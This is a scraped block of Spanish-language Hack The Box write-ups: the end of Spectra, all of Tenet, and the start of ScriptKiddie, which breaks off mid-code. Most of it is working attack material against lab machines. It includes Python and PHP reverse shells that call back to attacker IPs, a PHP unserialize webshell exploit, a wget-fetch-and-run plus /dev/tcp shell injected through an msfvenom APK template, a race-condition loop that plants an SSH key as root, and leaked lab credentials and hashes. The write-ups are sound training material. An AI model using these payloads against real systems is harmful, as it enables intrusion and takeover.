test2 stop/waiting katie@spectra ~ $   Revisamos los archivos de configuracion de cada uno de estos y encontramos que todos contienen lo mismo, y esque cuando este servicio es iniciado ejecuta con nodejs un archivo de javascript, que además tambien pertenece al grupo de developers por lo que es editable.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  katie@spectra ~ $ tail -n +1 /etc/init/test*.conf ==\u0026gt; /etc/init/test.conf \u0026lt;== description \u0026#34;Test node.js server\u0026#34; author \u0026#34;katie\u0026#34; start on filesystem or runlevel [2345] stop on shutdown script export HOME=\u0026#34;/srv\u0026#34; echo $$ \u0026gt; /var/run/nodetest.pid exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js end script pre-start script echo \u0026#34;[`date`] Node Test Starting\u0026#34; \u0026gt;\u0026gt; /var/log/nodetest.log end script pre-stop script rm /var/run/nodetest.pidLocal StateLocal StateLocal StateLocal State echo \u0026#34;[`date`] Node Test Stopping\u0026#34; \u0026gt;\u0026gt; /var/log/nodetest.log end script [... REDACTED ...] katie@spectra ~ $ ls -lah /srv/nodetest.js -rwxrwxr-x 1 root developers 251 Jun 29 2020 /srv/nodetest.js katie@spectra ~ $   El archivo javascript es un \u0026ldquo;mini servidor\u0026rdquo; que corre en el puerto 8081.\n1 2 3 4 5 6 7 8 9  var http = require(\u0026#34;http\u0026#34;); http.createServer(function (request, response) { response.writeHead(200, {\u0026#39;Content-Type\u0026#39;: \u0026#39;text/plain\u0026#39;}); response.end(\u0026#39;Hello World\\n\u0026#39;); }).listen(8081); console.log(\u0026#39;Server running at http://127.0.0.1:8081/\u0026#39;);   El \u0026ldquo;mini servidor\u0026rdquo; puede ser ejecutado por el usuario root mediante initctl, por lo que podriamos editar el archivo nodetest.js para ejecutar comandos como usuario root. Agregamos nuestro codigo para ejecutar una shell inversa de python al archivo nodetest.js.\n1 2  const { exec} = require(\u0026#39;child_process\u0026#39;); const child = exec(\u0026#39;python2.7 /home/katie/shell.py\u0026#39;);   1  import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.10.14.14\u0026#34;,1448));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);   1  sudo initctl start test \u0026amp;\u0026amp; sleep 10 \u0026amp;\u0026amp; curl -s http://127.0.0.1:8081/   Intentamos ejecutar el servicio test, pero el archivo nodetest.js era modificado seguramente por algun cron o script, por lo que intentamos varias veces y logramos obtener una shell con usuario root y nuestra flag root.txt.\n","description":"Spectra es una maquina con sistema ChromeOS. Obtuvimos acceso con privilegios limitados mediante las credenciales y enumeracion en Wordpress. Con credenciales de autologin obtuvimos acceso a otro usuario mediante SSH. Finalmente obtuvimos acceso privilegiado mediante una herramienta de control de servicios y modificacion de un archivo de JavaScript.","id":4,"section":"posts","tags":["wpscan","wordpress","initctl","sudo privesc","nodejs"],"title":"Hack The Box - Spectra","uri":"https://sckull.github.io/posts/spectra/"},{"content":"  Tenet es presentada con dificultad media, la enumeracion en wordpress nos llevo al codigo fuente de una pagina la cual fue vulnerada mediante un objeto serializado. Se utilizaron las credenciales en archivos de configuracion para realizar movimiento lateral. Un pequeño script para la escritura de nuestra clave privada en un archivo temporal proporciono una shell root.\n   Nombre Tenet      OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.223   Maker egotisticalSW    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[5.9, 4.7, 4.2, 5.8, 5.3], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[7, 4, 2, 8, 6], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     NMAP Escaneo de puertos con nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  # Nmap 7.91 scan initiated Tue Mar 30 23:41:39 2021 as: nmap -p- --min-rate 10000 -oN allports 10.10.10.223 Warning: 10.10.10.223 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.223 (10.10.10.223) Host is up (0.13s latency). Not shown: 36387 closed ports, 29146 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # Nmap done at Tue Mar 30 23:43:09 2021 -- 1 IP address (1 host up) scanned in 89.70 seconds # Nmap 7.91 scan initiated Tue Mar 30 23:43:28 2021 as: nmap -p 22,80 -sV -sC -oN serviceports 10.10.10.223 Nmap scan report for 10.10.10.223 (10.10.10.223) Host is up (0.067s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA) | 256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA) |_ 256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Mar 30 23:43:38 2021 -- 1 IP address (1 host up) scanned in 9.99 seconds   HTTP Encontramos la pagina de apache en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3  /index.html (Status: 200) /users.txt (Status: 200) /wordpress (Status: 301)   El archivo users.txt solo muestra un pequeño mensaje.\n1  Success   WORDPRESS La pagina de wordpress tiene configurado un dominio tenet.htb.\n1 2 3 4 5 6 7 8  HTTP/1.1 404 Not Found Date: Wed, 31 Mar 2021 03:52:10 GMT Server: Apache/2.4.29 (Ubuntu) Expires: Wed, 11 Jan 1984 05:00:00 GMT Cache-Control: no-cache, must-revalidate, max-age=0 Link: \u0026lt;http://tenet.htb/index.php/wp-json/\u0026gt;; rel=\u0026#34;https://api.w.org/\u0026#34; Transfer-Encoding: chunked Content-Type: text/html; charset=UTF-8   WPSCAN Utilizamos wpscan para enumerar plugins vulnerables y usuarios registrados. Encontramos dos nombres de usuario: protagonist y neil.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45  [+] URL: http://tenet.htb/ [10.10.10.223] [+] Started: Tue Mar 30 23:51:33 2021 Interesting Finding(s): [... REDACTED ...] [+] Upload directory has listing enabled: http://tenet.htb/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] WordPress version 5.6 identified (Outdated, released on 2020-12-08). | Found By: Rss Generator (Passive Detection) | - http://tenet.htb/index.php/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.6\u0026lt;/generator\u0026gt; | - http://tenet.htb/index.php/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.6\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentytwentyone | Location: http://tenet.htb/wp-content/themes/twentytwentyone/ [... REDACTED ...] | Version: 1.0 (80% confidence) | Found By: Style (Passive Detection) | - http://tenet.htb/wp-content/themes/twentytwentyone/style.css?ver=1.0, Match: \u0026#39;Version: 1.0\u0026#39; [+] Enumerating Vulnerable Plugins (via Passive Methods) [i] No plugins Found. [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:01 \u0026lt;========== ... ======\u0026gt; (10 / 10) 100.00% Time: 00:00:01 [i] User(s) Identified: [+] protagonist | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Wp Json Api (Aggressive Detection) | - http://tenet.htb/index.php/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] neil | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [... REDACTED ...]   Asi mismo enumeramos los diferentes posts, donde logramos obtener informacion en los comentarios de neil, menciona el archivo sator.php y backup.\n1  neil: did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!   Encontramos que el archivo sator.php aun existe pero no en el dominio que encontramos si no directamente en la direcion IP, por lo que posiblemente el backup esté en el mismo lugar.\n1 2  [+] Grabbing users from text file \u0026lt;br\u0026gt; [] Database updated \u0026lt;br\u0026gt;   PHP UNSERIALIZE - RCE Neil habla de un backup pero no especifíca de que archivo/software/db, aunque menciona sator.php, agregamos la extension de un backup (bak) al archivo sator.php.bak y logramos obtener el codigo fuente.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  \u0026lt;?php class DatabaseExport { public $user_file = \u0026#39;users.txt\u0026#39;; public $data = \u0026#39;\u0026#39;; public function update_db() { echo \u0026#39;[+] Grabbing users from text file \u0026lt;br\u0026gt;\u0026#39;; $this-\u0026gt; data = \u0026#39;Success\u0026#39;; } public function __destruct() { file_put_contents(__DIR__ . \u0026#39;/\u0026#39; . $this -\u0026gt;user_file, $this-\u0026gt;data); echo \u0026#39;[] Database updated \u0026lt;br\u0026gt;\u0026#39;; //\techo \u0026#39;Gotta get this working properly...\u0026#39;; \t} } $input = $_GET[\u0026#39;arepo\u0026#39;] ?? \u0026#39;\u0026#39;; $databaseupdate = unserialize($input); $app = new DatabaseExport; $app -\u0026gt; update_db(); ?\u0026gt;   Al analizar el codigo, observamos una variable que obtiene el valor pasado al parametro arepo por medio de una solicitud GET, este valor es unserializado (unzerialize($_GET['arepo'])), por ultimo se crea un objeto del tipo DatabaseExport() y realiza la ejecucion de la funcion update_db(). Sabiendo lo anterior vamos a enfocarnos en la funcion unserialize() ya que si se le pasa un valor serializado este puede ser ejecutado como se indica en la documentacion de php.\nAdvertencia: \u0026hellip; La deserialización puede resultar en que el código sea cargado y ejecutado debido a la instanciación y autocarga de objetos, y un usuario malicioso podría ser capaz de explotar este comportamiento. \u0026hellip; Un post que explica como es posible explotar esta vulnerabilidad. En el caso de sator.php, este crea y escribe dentro de un archivo con el valor de las variables. Si podriamos cambiar estos valores podriamos crear archivos con codigo PHP para la ejecucion de nuestro propio codigo. Para explotar unserialize() se crea una clase, se crea un objeto, se serializa y codifica en url, este valor se le pasa a sator.php?arepo=VALOR.\n1 2 3 4 5 6 7 8 9 10  \u0026lt;?php class DatabaseExport { public $user_file = \u0026#39;batman.php\u0026#39;; public $data = \u0026#39;\u0026lt;?php echo \u0026#34;knock knock\u0026#34;; ?\u0026gt;\u0026#39;; } echo urlencode(serialize(new DatabaseExport)); ?\u0026gt;   1 2 3 4 5  ┌──(kali㉿kali)-[~/htb/tenet] └─$ php example.php O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A10%3A%22batman.php%22%3Bs%3A4%3A%22data%22%3Bs%3A28%3A%22%3C%3Fphp+echo+%22knock+knock%22%3B+%3F%3E%22%3B%7D ┌──(kali㉿kali)-[~/htb/tenet] └─$ curl -s \u0026#34;http://10.10.10.223/sator.php?arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A10%3A%22batman.php%22%3Bs%3A4%3A%22data%22%3Bs%3A28%3A%22%3C%3Fphp+echo+%22knock+knock%22%3B+%3F%3E%22%3B%7D\u0026#34;   Confirmamos que el archivo se haya creado, por lo que ahora vamos a ejecutar comandos para enumerar la maquina utilizando una webshell o ejecutando una shell inversa.\n1 2 3 4 5  ┌──(kali㉿kali)-[~/htb/tenet] └─$ curl -s http://10.10.10.223/batman.php knock knock ┌──(kali㉿kali)-[~/htb/tenet] └─$   WWW-DATA - USER Utilizamos el siguiente codigo en la variable $data generamos el codigo serializado y codificado, se envia a la solicitud a sator.php para obtener una shell con el usuario www-data.\n1 2 3  \u0026lt;?php [... REDACTED ...] $data = \u0026#39;\u0026lt;?php $sock=fsockopen(\u0026#34;10.10.10.10\u0026#34;,1338);$proc=proc_open(\u0026#34;/bin/sh -i\u0026#34;, array(0=\u0026gt;$sock, 1=\u0026gt;$sock, 2=\u0026gt;$sock),$pipes);echo \u0026#34;hi\u0026#34; ?\u0026gt;\u0026#39;;   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  ┌──(kali㉿kali)-[~/htb/tenet] └─$ rlwrap nc -lvp 1338 listening on [any] 1338 ... connect to [10.10.10.10] from tenet.htb [10.10.10.223] 48066 can\u0026#39;t access tty; job control turned off which python which python3 /usr/bin/python3 python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; whoami;id;pwd whoami;id;pwd www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) /var/www/html www-data@tenet:/var/www/html$   NEIL - USER Realizamos una pequeña enumeracion en los archivos de wordpress donde logramos encontrar una contraseña que aparentemente es del usuario neil para la base de datos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  /** MySQL database username */ define( \u0026#39;DB_USER\u0026#39;, \u0026#39;neil\u0026#39; ); /** MySQL database password */ define( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;Opera2112\u0026#39; ); /** MySQL hostname */ define( \u0026#39;DB_HOST\u0026#39;, \u0026#39;localhost\u0026#39; ); /** Database Charset to use in creating database tables. */ define( \u0026#39;DB_CHARSET\u0026#39;, \u0026#39;utf8mb4\u0026#39; ); /** The Database Collate type. Don\u0026#39;t change this if in doubt. */ define( \u0026#39;DB_COLLATE\u0026#39;, \u0026#39;\u0026#39; ); define( \u0026#39;WP_HOME\u0026#39;, \u0026#39;http://tenet.htb\u0026#39;); define( \u0026#39;WP_SITEURL\u0026#39;, \u0026#39;http://tenet.htb\u0026#39;);   Verificamos que este mismo usuario exista en la maquina y tenga acceso en la maquina.\n1 2 3 4  www-data@tenet:/var$ root:x:0:0:root:/root:/bin/bash neil:x:1001:1001:neil,,,:/home/neil:/bin/bash www-data@tenet:/var$   Utilizamos la contraseña encontrada, logramos obtener una shell y nuestra flag user.txt en la carpeta de neil.\n1 2 3 4 5 6 7 8 9 10  su: Authentication failure www-data@tenet:/$ su neil Password: Opera2112 www-data@tenet:/$ echo $HOME /home/neil www-data@tenet:/$ cd www-data@tenet:/$ cat user.txt | cut -c1-15 ebd148d5598d5dd neil@tenet:~$   PRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el script enableSSH.sh. Vemos el codigo del script y realiza la escritura de la clave publica ssh del usuario root, pero vemos en la funcion addKey que genera un archivo temporal donde realiza la escritura de la clave publica, luego verifica si el archivo existe y si es asi escribe la clave en /root/.ssh/authorized_keys, finalmente elimina el archivo temporal creado.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  neil@tenet:~$ sudo -l -l Matching Defaults entries for neil on tenet: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\: User neil may run the following commands on tenet: Sudoers entry: RunAsUsers: ALL RunAsGroups: ALL Options: !authenticate Commands: /usr/local/bin/enableSSH.sh neil@tenet:~$ ls -lah /usr/local/bin/enableSSH.sh -rwxr-xr-x 1 root root 1.1K Dec 8 13:46 /usr/local/bin/enableSSH.sh neil@tenet:~$ cat /usr/local/bin/enableSSH.sh #!/bin/bash checkAdded() { sshName=$(/bin/echo $key | /usr/bin/cut -d \u0026#34; \u0026#34; -f 3) # root@ubuntu if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then /bin/echo \u0026#34;Successfully added $sshNameto authorized_keys file!\u0026#34; else /bin/echo \u0026#34;Error in adding $sshNameto authorized_keys file!\u0026#34; fi } checkFile() { if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then /bin/echo \u0026#34;Error in creating key file!\u0026#34; if [[ -f $1 ]]; then /bin/rm $1; fi exit 1 fi } addKey() { tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX) (umask 110; touch $tmpName) /bin/echo $key \u0026gt;\u0026gt;$tmpName checkFile $tmpName /bin/cat $tmpName \u0026gt;\u0026gt;/root/.ssh/authorized_keys /bin/rm $tmpName } key=\u0026#34;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu\u0026#34; addKey checkAdded # root@ubuntu neil@tenet:~$   La creacion del archivo temporal (tmpName), la escritura de la clave en este y la eliminacion del archivo temporal es demaciado rapida, por lo que debemos de escribir lo más rapido posible en el archivo temporal nuestra clave publica. Para ello realizamos un bucle while escribiendo en el archivo /tmp/ssh-* nuestra clave, hasta que en algun momento se realice la escritura ejecutando en repetidas ocaciones el script con sudo, al mismo tiempo realizamos intentos de ingreso por medio de ssh con usuario root a traves de ssh y esperamos a que en algun momento dado podamos acceder a la cuenta de root.\n1 2 3 4 5  #!/bin/bash while : do echo \u0026#34;ssh-rsa AAAAB3Nz[... REDACTED ...] neil@tenet\u0026#34; | tee /tmp/ssh* \u0026gt; /dev/null done   1 2  #Intentos en SSH. while true; do ssh -i .ssh/id_rsa root@localhost 2\u0026gt;/dev/null; done   Despues de varios intentos logramos obtener una shell con el usuario root y la flag root.txt.\n1 2 3 4 5 6 7 8 9  root@tenet:~# whoami; id; pwd root uid=0(root) gid=0(root) groups=0(root) /root root@tenet:~# ls root.txt root@tenet:~# cat root.txt | cut -c1-15 aaf8bff1f2fc43e root@tenet:~#   CRONTAB Encontramos un cron especificamente para eliminar el archivo authorized_keys.\n1 2 3 4 5  root@tenet:~# crontab -l # [ ... REDACTED ...] # m h dom mon dow command */3 * * * * rm /root/.ssh/authorized_keys */3 * * * * rm /dev/shm/*   MYSQL Dentro de la base de datos de wordpress encontramos la contraseña encriptada del usuario protagonist.\n1 2 3 4 5 6 7 8 9 10  mysql\u0026gt; select user_login,user_pass from wp_users; +-------------+------------------------------------+ | user_login | user_pass | +-------------+------------------------------------+ | protagonist | $P$BqNNfN07OWdaEfHmGwufBs.b.BebvZ. | | neil | $P$BtFC5SOvjEMFWLE4zq5DWXy7sJPUqM. | +-------------+------------------------------------+ 2 rows in set (0.00 sec) mysql\u0026gt;   ","description":"Tenet es presentada con dificultad media, la enumeracion en wordpress  nos llevo al codigo fuente de una pagina la cual fue vulnerada mediante un objeto serializado. Se utilizaron las credenciales en archivos de configuracion para realizar movimiento lateral. Un pequeño script para la escritura de nuestra clave privada en un archivo temporal proporciono una shell root.","id":5,"section":"posts","tags":["wpscan","wordpress","unserialize","php","sudo","bash script"],"title":"Hack The Box - Tenet","uri":"https://sckull.github.io/posts/tenet/"},{"content":"  ScriptKiddie es una maquina con dificultad Facil, obtuvimos acceso mediante la creacion de una plantilla apk para inyeccion de comandos. Mediante el analisis de codigo de la aplicacion web y scripts ejecutados por esta, realizamos una inyeccion de comandos para obtener acceso a un segundo usuario. Finalmente para obtener acceso como superusuario utilizamos los permisos sudo para ejecutar metasploit.\n   Nombre ScriptKiddie      OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.226   Maker 0xdf    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[4.5, 3.4, 5.1, 4.9, 6.6], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[3, 4, 8, 2, 6], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     -- RECON NMAP Escaneo de puertos con nmap nos muestra el puerto ssh (22) y el puerto http (5000) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  Nmap scan report for 10.129.72.163 (10.129.72.163) Host is up (0.16s latency). Not shown: 62106 closed ports, 3427 filtered ports PORT STATE SERVICE 22/tcp open ssh 5000/tcp open upnp Nmap scan report for 10.129.72.163 (10.129.72.163) Host is up (0.067s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 5000/tcp open http Werkzeug httpd 0.16.1 (Python 3.8.5) |_http-server-header: Werkzeug/0.16.1 Python/3.8.5 |_http-title: k1d\u0026#39;5 h4ck3r t00l5 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   HTTP Encontramos una pagina web en el puerto 80 donde se muestran 3 secciones.\n La primera opcion es para realizar un escaneo de puertos a una determinada IP utilizando nmap en su version 7.80. La segunda, genera un payload para Linux, Windows y Android utilizando lo que parece ser msfvenom, donde es posible subir una template para generar el payload. En la tercera, realiza una busqueda de exploits utilizando searchsploit.  Verificamos cada uno de los parametros por posible Inyeccion de Comandos e intentar descargar algun archivo en la maquina pero no logramos nada. Además cada vez que intentavamos ejecutar algun comando nos mostraba el mensaje stop hacking me - well hack you back.\nEl mensaje stop hacking me - well hack you back dejaba en duda si la maquina realizaba algun tipo de escaneo, ping o solicitudes a nuestra maquina por lo que utilizamos wireshark para analizar los paquetes y vemos que realiza un escaneo de puertos a nuestra maquina despues de enviar algun metacaracter o algo que no fuera una letra o numero.\nKID - USER MSFVENOM - APK TEMPLATE Realizamos una busqueda de posibles vulnerabilidades para msfvenom y encontramos una vulnerabilidad de Inyeccion de comandos a partir de un template de APK lo que nos permitiría ejecutar una shell inversa. En el exploit, editamos y agregamos nun comando para descargar y ejecutar nuestra shell inversa en la variable payload, creamos el archivo que contiene nuestro comando, ejecutamos un mini-server con python y escuchamos el puerto con netcat.\n1 2 3 4 5 6 7 8 9 10 11  #variable - payload payload = \u0026#39;$(bash -c \u0026#34;$(wget -qO- 10.10.14.166/shell.sh)\u0026#34;)\u0026#39; #shell.sh bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.166/1338 0\u0026gt;\u0026amp;1 #local host python -m http.server 80 #listen netcat port nc -lvvp 1338   Generamos nuestro apk y lo enviamos como un template de Android ingresando una IP cualquiera.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  kali@kali:~/htb/scriptkiddie$ python3 exploit_apk_template.py [+] Manufacturing evil apkfile Payload: $(bash -c \u0026#34;$(wget -qO- 10.10.14.166/shell.sh)\u0026#34;) -dname: CN=\u0026#39;|echo JChiYXNoIC1jICIkKHdnZXQgLXFPLSAxMC4xMC4xNC4xNjYvc2hlbGwuc2gpIik= | base64 -d | sh # adding: empty (stored 0%) Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true jar signed. Warning: The signer\u0026#39;s certificate is self-signed. [+] Done! apkfile is at /tmp/tmpidnixpiw/evil.apk Do: msfvenom -x /tmp/tmpidnixpiw/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null   Logramos obtener una shell con el usuario kid y nuestra flag user.txt.\nTambien logramos obtener el codigo fuente de la aplicacion.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107  import datetime import os import random import re import subprocess import tempfile import time from flask import Flask, render_template, request from hashlib import md5 from werkzeug.utils import secure_filename regex_ip = re.compile(r\u0026#39;^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$\u0026#39;) regex_alphanum = re.compile(r\u0026#39;^[A-Za-z0-9 \\.]+$\u0026#39;) OS_2_EXT = {\u0026#39;windows\u0026#39;: \u0026#39;exe\u0026#39;, \u0026#39;linux\u0026#39;: \u0026#39;elf\u0026#39;, \u0026#39;android\u0026#39;: \u0026#39;apk\u0026#39;} app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;,\u0026#39;POST\u0026#39;]) def index(): if request.method == \u0026#39;GET\u0026#39; or not \u0026#39;action\u0026#39; in request.form: return render_template(\u0026#39;index.html\u0026#39;) elif request.form[\u0026#39;action\u0026#39;] == \u0026#39;scan\u0026#39;: return scan(request.form[\u0026#39;ip\u0026#39;]) elif request.form[\u0026#39;action\u0026#39;] == \u0026#39;generate\u0026#39;: return venom(request) elif request.form[\u0026#39;action\u0026#39;] == \u0026#39;searchsploit\u0026#39;: return searchsploit(request.form[\u0026#39;search\u0026#39;], request.remote_addr) print(\u0026#34;no valid action\u0026#34;) return request.form def scan(ip): if regex_ip.match(ip): if not ip == request.remote_addr and ip.startswith(\u0026#39;10.10.1\u0026#39;) and not ip.startswith(\u0026#39;10.10.10.\u0026#39;): stime = random.randint(200,400)/100 time.sleep(stime) result = f\u0026#34;\u0026#34;\u0026#34;Starting Nmap 7.80 ( https://nmap.org ) at {datetime.datetime.utcnow().strftime(\u0026#34;%Y-%m-%d%H:%M\u0026#34;)} UTC\\nNote: Host seems down. If it is really up, but blocking our ping probes, try -Pn\\nNmap done: 1 IP address (0 hosts up) scanned in {stime} seconds\u0026#34;\u0026#34;\u0026#34;.encode() else: result = subprocess.check_output([\u0026#39;nmap\u0026#39;, \u0026#39;--top-ports\u0026#39;, \u0026#39;100\u0026#39;, ip]) return render_template(\u0026#39;index.html\u0026#39;, scan=result.decode(\u0026#39;UTF-8\u0026#39;, \u0026#39;ignore\u0026#39;)) return render_template(\u0026#39;index.html\u0026#39;, scanerror=\u0026#34;invalid ip\u0026#34;) def searchsploit(text, srcip): if regex_alphanum.match(text): result = subprocess.check_output([\u0026#39;searchsploit\u0026#39;, \u0026#39;--color\u0026#39;, text]) return render_template(\u0026#39;index.html\u0026#39;, searchsploit=result.decode(\u0026#39;UTF-8\u0026#39;, \u0026#39;ignore\u0026#39;)) else: with open(\u0026#39;/home/kid/logs/hackers\u0026#39;, \u0026#39;a\u0026#39;) as f: f.write(f\u0026#39;[{datetime.datetime.now()}] {srcip}\\n\u0026#39;) return render_template(\u0026#39;index.html\u0026#39;, sserror=\u0026#34;stop hacking me - well hack you back\u0026#34;) def 